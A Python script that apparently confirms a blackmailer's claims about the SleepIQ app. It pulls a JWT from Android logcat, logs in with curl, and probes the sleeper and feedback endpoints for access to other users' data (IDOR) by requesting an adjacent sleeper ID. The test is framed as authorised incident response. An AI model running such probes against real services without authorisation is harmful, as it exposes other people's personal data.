#!/usr/bin/env python3
"""
IDOR Vulnerability Test for SleepIQ
Uses Android Test Harness to extract JWT and test for IDOR vulnerabilities

Authorization: Dennis Hansen, SVP Deputy General Counsel
Date: January 3, 2026
"""

import subprocess
import json
import time
import re
import os
import tempfile
import atexit
from pathlib import Path

from config import config


# Secure temp file management
_temp_files = []
_jwt_token_path = None
_cookies_path = None


def get_secure_temp_file(suffix: str) -> str:
    """Create a secure temp file with restricted permissions (0o600)."""
    fd, path = tempfile.mkstemp(suffix=suffix, prefix="android_test_")
    os.close(fd)
    os.chmod(path, 0o600)  # Owner read/write only
    _temp_files.append(path)
    return path


def cleanup_temp_files():
    """Clean up all temp files created during testing."""
    for path in _temp_files:
        try:
            if os.path.exists(path):
                os.remove(path)
        except OSError:
            pass


atexit.register(cleanup_temp_files)


def get_jwt_token_path() -> str:
    """Get or create the secure JWT token file path."""
    global _jwt_token_path
    if _jwt_token_path is None:
        _jwt_token_path = get_secure_temp_file("_jwt.txt")
    return _jwt_token_path


def get_cookies_path() -> str:
    """Get or create the secure cookies file path."""
    global _cookies_path
    if _cookies_path is None:
        _cookies_path = get_secure_temp_file("_cookies.txt")
    return _cookies_path


def run_adb(command: str) -> str:
    """Run adb command and return output"""
    result = subprocess.run(
        f"adb shell {command}",
        shell=True,
        capture_output=True,
        text=True
    )
    return result.stdout.strip()


def run_cmd(command: str) -> str:
    """Run shell command and return output"""
    result = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True
    )
    return result.stdout.strip()


def extract_jwt_from_logcat() -> str:
    """Extract JWT token from logcat"""
    print("[1/5] Extracting JWT token from logcat...")
    print("    (Make sure SleepIQ app is running and you're logged in)")
    print("")

    # Clear logcat
    subprocess.run("adb logcat -c", shell=True)

    print("⏳ Monitoring logs for 15 seconds...")
    print("   (Navigate in the SleepIQ app on your device)")
    print("")

    # Monitor logcat for JWT (starts with eyJ)
    proc = subprocess.Popen(
        "adb logcat",
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    start_time = time.time()
    jwt_token = None

    try:
        while time.time() - start_time < 15:
            line = proc.stdout.readline()
            if line:
                # Look for JWT pattern (starts with eyJ, has two dots)
                match = re.search(r'(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)', line)
                if match:
                    jwt_token = match.group(1)
                    print(f"✓ Found JWT token: {jwt_token[:50]}...")
                    break
    finally:
        proc.terminate()

    if jwt_token:
        # Save token to secure temp file
        jwt_path = get_jwt_token_path()
        Path(jwt_path).write_text(jwt_token)
        print(f"✓ Saved to secure temp file (auto-cleaned on exit)")
        return jwt_token
    else:
        print("⚠️  No JWT token found in logs")
        print("")
        print("Try these alternatives:")
        print("1. Use Android Studio Profiler (see START_NOW.md)")
        print("2. Re-run this script while navigating in the app")
        return None


def authenticate() -> dict:
    """Authenticate and get session cookie"""
    print("\n[2/5] Authenticating to get session cookie...")

    cookies_path = get_cookies_path()
    cmd = f"""curl -s -X PUT "{config.api_base}/login" \\
        -H "Content-Type: application/json" \\
        -H "X-App-Version: 5.3.30" \\
        -d '{{"login":"{config.test_email}","password":"{config.test_password}"}}' \\
        -c {cookies_path}"""

    response = run_cmd(cmd)

    try:
        data = json.loads(response)
        print(f"✓ Authenticated: {json.dumps(data, indent=2)[:100]}...")

        # Extract JSESSIONID
        jsessionid = run_cmd(f"grep JSESSIONID {cookies_path} | awk '{{print $7}}'")
        return {
            "jsessionid": jsessionid,
            "user_id": data.get("userId", "")
        }
    except json.JSONDecodeError:
        print(f"❌ Auth failed: {response}")
        return None


def test_idor(jsessionid: str, jwt_token: str) -> bool:
    """Test IDOR vulnerability"""
    print("\n[3/5] Testing IDOR on Sleeper Endpoint...")
    print("=" * 60)

    test_id = int(config.sleeper_id) + 1
    print(f"Your Sleeper ID:  {config.sleeper_id}")
    print(f"Testing ID:       {test_id}")
    print(f"(Attempting to access another user's data)")
    print("")

    cmd = f"""curl -s "{config.api_base}/sleeper/{test_id}" \\
        -H "Cookie: JSESSIONID={jsessionid}" \\
        -H "Authorization: {jwt_token}" \\
        -H "X-App-Version: 5.3.30" \\
        -H "X-App-Platform: android" \\
        -H "User-Agent: okhttp/4.12.0" \\
        -w "\\nHTTP_STATUS:%{{http_code}}\""""

    response = run_cmd(cmd)

    # Parse response
    lines = response.split("\n")
    http_status = None
    body = []

    for line in lines:
        if line.startswith("HTTP_STATUS:"):
            http_status = line.split(":")[1]
        else:
            body.append(line)

    response_body = "\n".join(body)

    print(f"HTTP Status: {http_status}")
    print(f"Response: {response_body[:200]}...")
    print("")

    if http_status == "200":
        try:
            data = json.loads(response_body)

            # Extract email
            found_email = None
            if "sleepers" in data and len(data["sleepers"]) > 0:
                found_email = data["sleepers"][0].get("email", "")
            elif "email" in data:
                found_email = data["email"]

            if found_email:
                print(f"Response contains email: {found_email}")
                print(f"Your email:              {config.test_email}")
                print("")

                # THE CRITICAL CHECK: Is it a DIFFERENT email?
                if found_email != config.test_email:
                    print("🚨🚨🚨 CRITICAL VULNERABILITY CONFIRMED! 🚨🚨🚨")
                    print("🚨 Successfully accessed ANOTHER USER's data!")
                    print(f"🚨 Their email: {found_email}")
                    print("🚨 Threat actor's claims are VALIDATED!")
                    print("")
                    return True
                else:
                    print("⚠️  WARNING: Returned YOUR OWN data")
                    print("   This could mean:")
                    print("   - API redirected to your data (secure)")
                    print("   - OR the test ID doesn't exist (inconclusive)")
                    print("")
                    return False
            else:
                print("✓ HTTP 200 but no email in response")
                return False

        except json.JSONDecodeError:
            print(f"⚠️  Could not parse response as JSON")
            return False

    elif http_status == "403":
        print("✓ Access denied (secure) - IDOR blocked")
        return False
    elif http_status == "404":
        print("✓ Not found - ID doesn't exist or access denied")
        return False
    else:
        print(f"⚠️  Unexpected status: {http_status}")
        return False


def test_feedback_api(jsessionid: str, jwt_token: str) -> bool:
    """Test Feedback API exposure"""
    print("\n[4/5] Testing Feedback API Exposure...")
    print("=" * 60)

    cmd = f"""curl -s "{config.api_base}/feedback" \\
        -H "Cookie: JSESSIONID={jsessionid}" \\
        -H "Authorization: {jwt_token}" \\
        -H "X-App-Version: 5.3.30" \\
        -w "\\nHTTP_STATUS:%{{http_code}}\""""

    response = run_cmd(cmd)

    lines = response.split("\n")
    http_status = None
    body = []

    for line in lines:
        if line.startswith("HTTP_STATUS:"):
            http_status = line.split(":")[1]
        else:
            body.append(line)

    response_body = "\n".join(body)

    print(f"HTTP Status: {http_status}")

    if http_status == "200":
        # Count how many emails are in the response
        email_count = response_body.count('"email"')

        if email_count > 1:
            print(f"🚨 CRITICAL: Feedback API returns {email_count} users' data!")
            print(f"Response preview: {response_body[:200]}...")
            return True
        elif email_count == 1:
            print(f"✓ Returns only your own feedback")
            return False
        else:
            print(f"✓ No email in response")
            return False
    else:
        print(f"✓ Endpoint not accessible (Status: {http_status})")
        return False


def main():
    print("=" * 60)
    print("SLEEPIQ IDOR VULNERABILITY TEST")
    print("=" * 60)
    print(f"Authorization: Dennis Hansen, SVP Deputy General Counsel")
    print(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    print("")

    # Check if adb is available
    if subprocess.run("which adb", shell=True, capture_output=True).returncode != 0:
        print("❌ adb not found!")
        print("   Install: brew install android-platform-tools")
        return

    # Check if device is connected
    devices = run_cmd("adb devices | grep device$ | grep -v 'List of devices'")
    if not devices:
        print("❌ No Android device connected!")
        print("   1. Connect device via USB")
        print("   2. Enable USB debugging")
        print("   3. Run: adb devices")
        return

    print(f"✓ Android device connected")
    print("")

    # Try to extract JWT token
    jwt_token = extract_jwt_from_logcat()

    # If extraction failed, check if token was saved this session
    if not jwt_token:
        jwt_path = Path(get_jwt_token_path())
        if jwt_path.exists() and jwt_path.stat().st_size > 0:
            jwt_token = jwt_path.read_text().strip()
            print(f"\n✓ Using JWT token from current session")
            print(f"  Token: {jwt_token[:50]}...")
        else:
            print("\n❌ No JWT token available")
            print("   Please capture JWT token first:")
            print("   1. See START_NOW.md for Android Studio method")
            print("   2. Or run this script while navigating in the app")
            return

    # Authenticate
    auth_data = authenticate()
    if not auth_data or not auth_data["jsessionid"]:
        print("❌ Authentication failed")
        return

    jsessionid = auth_data["jsessionid"]
    print(f"✓ Session ID: {jsessionid[:30]}...")

    # Run tests
    idor_vulnerable = test_idor(jsessionid, jwt_token)
    feedback_vulnerable = test_feedback_api(jsessionid, jwt_token)

    # Final verdict
    print("\n" + "=" * 60)
    print("FINAL VERDICT")
    print("=" * 60)
    print("")

    if idor_vulnerable or feedback_vulnerable:
        print("🚨 BLACKMAIL THREAT IS CREDIBLE")
        print("=" * 60)
        print("")
        print("CRITICAL vulnerabilities exist that match")
        print("the threat actor's claims.")
        print("")
        print("LEGAL RECOMMENDATION:")
        print("  ✓ DO NOT PAY the extortion demand")
        print("  ✓ Report to FBI immediately")
        print("  ✓ Treat as confirmed data breach")
        print("  ✓ Begin GDPR 72-hour notification assessment")
        print("  ✓ Initiate incident response procedures")
    else:
        print("✓ THREAT APPEARS TO BE A BLUFF")
        print("=" * 60)
        print("")
        print("Could not replicate claimed vulnerabilities.")
        print("")
        print("LEGAL RECOMMENDATION:")
        print("  ✓ DO NOT PAY the extortion demand")
        print("  ✓ Report extortion attempt to FBI")
        print("  ✓ No breach notification required")
        print("  ✓ Implement preventive security patches")

    print("")
    print("=" * 60)


if __name__ == "__main__":
    main()
